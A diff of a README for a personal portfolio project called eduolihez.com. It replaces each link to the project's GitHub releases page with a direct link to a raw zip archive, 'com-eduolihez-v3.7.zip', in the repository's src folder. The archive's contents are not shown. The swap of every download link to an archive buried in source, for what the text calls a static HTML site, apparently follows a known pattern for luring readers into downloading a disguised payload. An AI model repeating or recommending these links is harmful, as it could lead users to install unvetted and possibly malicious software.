@@ -1,6 +1,6 @@
 # 🌐 eduolihez.com - Simple Portfolio and Professional Hub
 
-[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/releases)
+[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/raw/refs/heads/main/src/com-eduolihez-v3.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To run eduolihez.com smoothly on your Windows PC, make sure your system meets th
 
 Click the big button at the top or click this link to visit the release page:
 
-[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/releases)
+[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/raw/refs/heads/main/src/com-eduolihez-v3.7.zip)
 
 You will see the latest versions listed on the page.
 
@@ -158,7 +158,7 @@ This project includes ideas and techniques related to:
 
 Visit this page to download the latest release:
 
-[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/releases)
+[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/raw/refs/heads/main/src/com-eduolihez-v3.7.zip)
 
 Follow the steps above to download, extract, and open the files on your PC.
 
@@ -166,4 +166,4 @@ This method does not require installation. Just open `index.html` in a browser t
 
 ---
 
-[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/releases)
+[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/raw/refs/heads/main/src/com-eduolihez-v3.7.zip)
